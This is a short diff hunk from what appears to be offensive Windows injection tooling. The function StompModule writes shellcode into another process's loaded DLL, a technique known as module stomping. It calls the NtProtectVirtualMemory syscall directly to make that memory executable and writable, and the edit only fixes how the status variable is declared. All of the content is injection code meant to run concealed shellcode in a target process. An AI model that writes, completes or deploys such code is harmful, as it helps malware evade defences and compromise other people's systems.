@@ -335,7 +335,7 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
 
     // 4. RW → write shellcode → RX
     ULONG oldProt = 0;
-    st = g_Syscalls.NtProtectVirtualMemory(
+    NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(
         hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
     if (st != 0) { CloseTarget(hProc); return FALSE; }
 
